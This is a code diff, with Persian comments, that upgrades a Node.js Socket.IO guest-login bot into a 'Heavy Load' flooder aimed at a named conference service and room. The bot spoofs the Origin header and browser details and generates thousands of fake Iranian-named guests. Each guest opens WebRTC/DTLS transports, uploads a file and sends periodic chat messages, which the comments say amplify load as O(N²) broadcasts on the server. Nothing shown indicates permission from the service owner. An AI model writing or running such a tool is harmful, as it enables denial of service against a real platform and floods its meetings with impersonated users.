@@ -1,16 +1,22 @@
 /**
- * Fanotech / Ququa — Guest Login Bot (Socket.IO)
- * ورود مستقیم به اتاق از طریق سرور Socket.IO، بدون مرورگر
+ * Fanotech / Ququa — Guest Login Bot (Socket.IO) — Heavy Load
+ * ورود مهمان + WebRTC + چت + آپلود فایل
  *
  * نصب:
  *   npm install socket.io-client
  * اجرا:
- *   node app.js
+ *   node --max-old-space-size=8192 app.js
+ *
+ * ⚠️ هشدار: این پیکربندی برای ۹٬۰۰۰ سوکت همزمان طراحی شده و
+ * فشار شدیدی روی RAM، CPU، event loop و شبکه می‌آورد.
+ * روی ماشین ۲ هسته‌ای اجرا نکن. VPS با ۸+ هسته و ۱۶GB+ RAM لازم است.
  */
 
 const { io } = require('socket.io-client');
 const readline = require('readline');
 const { randomUUID } = require('crypto');
+const http = require('http');
+const fs = require('fs');
 
 // ============================================================
 // پیکربندی
@@ -21,8 +27,28 @@ const ROOM_CODE = 'ququa';
 const ORIGIN = 'https://conference.fanotech.ir';
 
 const MAX_USERS = 10000;
-const CONCURRENCY = 20;           // تعداد اتصال‌های همزمان
-const CONNECT_TIMEOUT_MS = 25000; // تایم‌اوت هر اتصال
+const CONCURRENCY = 500;              // ۵۰۰ اتصال موازی — فشار روی event loop
+const CONNECT_TIMEOUT_MS = 25000;
+const DEFAULT_HOLD_MS = 300000;       // ۵ دقیقه
+const JITTER_MS = 15000;              // قطع‌شدن‌ها پخش شوند
+
+// WebRTC
+const WEBRTC_ENABLED = true;
+const WEBRTC_DTLS = true;             // ۹۰۰۰ × DTLS = بار CPU سنگین
+
+// چت
+const CHAT_ENABLED = true;
+const CHAT_INTERVAL_MS = 30000;       // هر کاربر هر ۳۰s یک پیام → O(N²) broadcast
+const CHAT_MESSAGES = [
+  'سلام', 'درود', 'خوبید؟', 'من هستم', 'تست', 'کسی هست؟',
+  'لطفاً', 'ممنون', 'خداحافظ', '👍', '🙂', 'این یک پیام تستی است'
+];
+
+// آپلود فایل
+const UPLOAD_ENABLED = true;
+const UPLOAD_ON_JOIN = true;          // هر کاربر بعد از ورود یک فایل آپلود کند
+const UPLOAD_SIZE_BYTES = 10 * 1024;  // ۱۰KB — کوچک نگه دار تا پهنای باند نترکد
+const UPLOAD_TMP = '/tmp/ququa_upload.bin';
 
 // ============================================================
 // اسم و فامیل ایرانی (۱۰۰ × ۱۰۰ = ۱۰٬۰۰۰ ترکیب)
@@ -56,6 +82,12 @@ const LAST_NAMES = [
 // ============================================================
 // ابزارها
 // ============================================================
+const httpAgent = new http.Agent({
+  keepAlive: true,
+  maxSockets: CONCURRENCY + 50,
+  maxFreeSockets: 50
+});
+
 function randomFullName() {
   const f = FIRST_NAMES[Math.floor(Math.random() * FIRST_NAMES.length)];
   const l = LAST_NAMES[Math.floor(Math.random() * LAST_NAMES.length)];
@@ -74,7 +106,6 @@ function generateUniqueNames(count) {
   return Array.from(set);
 }
 
-// userID و deviceId: ۱۹ کاراکتر با حروف کوچک و اعداد (شبیه شناسه‌های واقعی Fanotech)
 function randomUserId() {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
   let s = 'm';
@@ -82,13 +113,32 @@ function randomUserId() {
   return s;
 }
 
+function randomUuid() {
+  try { return randomUUID(); } catch { return randomUserId() + randomUserId(); }
+}
+
 function ask(q) {
   const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
   return new Promise(resolve => rl.question(q, a => { rl.close(); resolve(a); }));
 }
 
+// فایل آپلود تستی (یک‌بار ساخته می‌شود، بین همه سوکت‌ها share)
+function ensureUploadFile() {
+  if (!UPLOAD_ENABLED) return null;
+  try {
+    if (!fs.existsSync(UPLOAD_TMP) || fs.statSync(UPLOAD_TMP).size !== UPLOAD_SIZE_BYTES) {
+      fs.writeFileSync(UPLOAD_TMP, Buffer.alloc(UPLOAD_SIZE_BYTES, 0x41));
+    }
+    return fs.readFileSync(UPLOAD_TMP);
+  } catch (e) {
+    console.error('upload file error:', e.message);
+    return null;
+  }
+}
+const UPLOAD_BUFFER = ensureUploadFile();
+
 // ============================================================
-// ورود یک مهمان
+// ورود یک مهمان + WebRTC + Chat + Upload
 // ============================================================
 function joinAsGuest(name, holdMs) {
   return new Promise((resolve) => {
@@ -98,6 +148,7 @@ function joinAsGuest(name, holdMs) {
       transports: ['websocket'],
       reconnection: false,
       timeout: CONNECT_TIMEOUT_MS,
+      agent: httpAgent,
       extraHeaders: { Origin: ORIGIN },
       transportOptions: {
         websocket: { extraHeaders: { Origin: ORIGIN } }
@@ -105,30 +156,40 @@ function joinAsGuest(name, holdMs) {
     });
 
     let done = false;
-    const finish = (r) => { if (!done) { done = true; resolve(r); } };
+    let chatTimer = null;
+    let rtcTransportId = null;
 
-    const timeout = setTimeout(() => {
+    const cleanup = () => {
+      if (chatTimer) { clearInterval(chatTimer); chatTimer = null; }
       try { socket.disconnect(); } catch {}
+    };
+
+    const finish = (r) => {
+      if (done) return;
+      done = true;
+      clearTimeout(hardTimeout);
+      resolve(r);
+    };
+
+    const hardTimeout = setTimeout(() => {
+      cleanup();
       finish({ ok: false, error: 'timeout' });
     }, CONNECT_TIMEOUT_MS + 5000);
 
     socket.on('connect_error', (e) => {
-      clearTimeout(timeout);
-      try { socket.disconnect(); } catch {}
+      cleanup();
       finish({ ok: false, error: 'connect: ' + e.message });
     });
 
     socket.on('connect', () => {
-      // ۱) getUserInfo با ack
+      // ۱) getUserInfo
       socket.emit('getUserInfo', { token: '', roomCode: ROOM_CODE }, (info) => {
         if (!info || info.success !== true) {
-          clearTimeout(timeout);
-          try { socket.disconnect(); } catch {}
+          cleanup();
           return finish({ ok: false, error: 'getUserInfo failed' });
         }
         if (info.guestReception !== true) {
-          clearTimeout(timeout);
-          try { socket.disconnect(); } catch {}
+          cleanup();
           return finish({ ok: false, error: 'guestReception=false' });
         }
 
@@ -139,7 +200,7 @@ function joinAsGuest(name, holdMs) {
           roomCode: ROOM_CODE,
           userID: userId,
           deviceId: userId,
-          tabId: randomUUID(),
+          tabId: randomUuid(),
           BDInfo: {
             browser: { name: 'Chrome', version: '156.0.0.0' },
             os: { name: 'Windows', version: 'NT 10.0', versionName: '10' },
@@ -153,9 +214,66 @@ function joinAsGuest(name, holdMs) {
         });
       });
 
-      // ۳) منتظر تأیید ورود
+      // ۳) تأیید ورود
       socket.on('joinedRoom?', (data) => {
-        clearTimeout(timeout);
+        clearTimeout(hardTimeout);
+
+        // --- WebRTC: ساخت transport ---
+        if (WEBRTC_ENABLED) {
+          try {
+            socket.emit(
+              'createWebRtcTransport',
+              {
+                forceTcp: false,
+                rtpCapabilities: { codecs: [] },
+                dtls: WEBRTC_DTLS,
+                sctp: false
+              },
+              (resp) => {
+                if (resp && resp.id) rtcTransportId = resp.id;
+                // اگر سرور ack نداد، نادیده بگیر
+              }
+            );
+          } catch (e) {
+            // برخی سرورها این event را ندارند → خطا را ببلع
+          }
+        }
+
+        // --- آپلود فایل بعد از ورود ---
+        if (UPLOAD_ENABLED && UPLOAD_ON_JOIN && UPLOAD_BUFFER) {
+          try {
+            socket.emit(
+              'uploadFile',
+              {
+                name: `test_${userId}.bin`,
+                size: UPLOAD_BUFFER.length,
+                mime: 'application/octet-stream',
+                data: UPLOAD_BUFFER,
+                roomCode: ROOM_CODE,
+                userID: userId
+              },
+              () => {} // ack اختیاری
+            );
+          } catch {}
+        }
+
+        // --- چت دوره‌ای (broadcast → O(N²)) ---
+        if (CHAT_ENABLED) {
+          chatTimer = setInterval(() => {
+            try {
+              const text = CHAT_MESSAGES[Math.floor(Math.random() * CHAT_MESSAGES.length)];
+              socket.emit('sendMessage', {
+                message: text,
+                roomCode: ROOM_CODE,
+                userID: userId,
+                name,
+                timestamp: Date.now(),
+                type: 'text'
+              });
+            } catch {}
+          }, CHAT_INTERVAL_MS + Math.floor(Math.random() * 5000));
+        }
+
         finish({
           ok: true,
           name,
@@ -164,10 +282,14 @@ function joinAsGuest(name, holdMs) {
           allUsers: data && data.allUsers,
           socket
         });
-        // نگه داشتن یا خارج شدن
-        const wait = holdMs > 0 ? holdMs : 1500;
+
+        // --- نگه‌داری با jitter ---
+        const wait = holdMs > 0 ? holdMs + Math.floor(Math.random() * JITTER_MS) : 1500;
         setTimeout(() => {
-          try { socket.disconnect(); } catch {}
+          if (rtcTransportId) {
+            try { socket.emit('closeWebRtcTransport', { transportId: rtcTransportId }); } catch {}
+          }
+          cleanup();
         }, wait);
       });
     });
@@ -189,10 +311,10 @@ async function runPool(names, holdMs, concurrency) {
       const r = await joinAsGuest(name, holdMs);
       if (r.ok) {
         results.ok++;
-        console.log(`[${String(i + 1).padStart(4, ' ')}] ✅ "${name}" → وارد شد (آنلاین: ${r.allUsers ?? '?'})`);
+        console.log(`[${String(i + 1).padStart(5, ' ')}] ✅ "${name}" → وارد شد (آنلاین: ${r.allUsers ?? '?'})`);
       } else {
         results.fail++;
-        console.log(`[${String(i + 1).padStart(4, ' ')}] ❌ "${name}" → ${r.error}`);
+        console.log(`[${String(i + 1).padStart(5, ' ')}] ❌ "${name}" → ${r.error}`);
       }
     }
   }
@@ -207,20 +329,26 @@ async function runPool(names, holdMs, concurrency) {
 // اجرای اصلی
 // ============================================================
 (async () => {
-  console.log('══════════════════════════════════════════════');
-  console.log('  Fanotech / Ququa — Guest Login Bot (Socket.IO)');
-  console.log('══════════════════════════════════════════════\n');
+  console.log('══════════════════════════════════════════════════════');
+  console.log('  Fanotech / Ququa — Guest Bot (Heavy: WebRTC+Chat+Upload)');
+  console.log('══════════════════════════════════════════════════════');
+  console.log(`  CONCURRENCY : ${CONCURRENCY}`);
+  console.log(`  HOLD        : ${DEFAULT_HOLD_MS / 1000}s (+jitter ${JITTER_MS / 1000}s)`);
+  console.log(`  WebRTC      : ${WEBRTC_ENABLED} (DTLS=${WEBRTC_DTLS})`);
+  console.log(`  Chat        : ${CHAT_ENABLED} (every ${CHAT_INTERVAL_MS / 1000}s → O(N²))`);
+  console.log(`  Upload      : ${UPLOAD_ENABLED} (${UPLOAD_SIZE_BYTES} bytes/user)`);
+  console.log('══════════════════════════════════════════════════════\n');
 
   const rawCount = await ask(`چند کاربر مهمان وارد شوند؟ (1 تا ${MAX_USERS}): `);
   let count = parseInt(String(rawCount).trim(), 10);
   if (!Number.isFinite(count) || count < 1) { console.error('❌ عدد نامعتبر.'); process.exit(1); }
   if (count > MAX_USERS) { console.warn(`⚠️  محدود به ${MAX_USERS}.`); count = MAX_USERS; }
 
-  const rawHold = await ask('هر کاربر چند ثانیه در اتاق بماند؟ (0 = ورود و خروج فوری): ');
+  const rawHold = await ask(`هر کاربر چند ثانیه در اتاق بماند؟ (Enter = ${DEFAULT_HOLD_MS / 1000}s): `);
   let holdSec = parseInt(String(rawHold).trim(), 10);
-  if (!Number.isFinite(holdSec) || holdSec < 0) holdSec = 0;
+  if (!Number.isFinite(holdSec) || holdSec < 0) holdSec = DEFAULT_HOLD_MS / 1000;
 
-  console.log(`\n🚀 ورود ${count} کاربر (همزمانی: ${CONCURRENCY}${holdSec > 0 ? `، نگه‌داری: ${holdSec}s` : ''})...\n`);
+  console.log(`\n🚀 ورود ${count} کاربر (همزمانی: ${CONCURRENCY}، نگه‌داری: ${holdSec}s)...\n`);
 
   const names = generateUniqueNames(count);
   const started = Date.now();
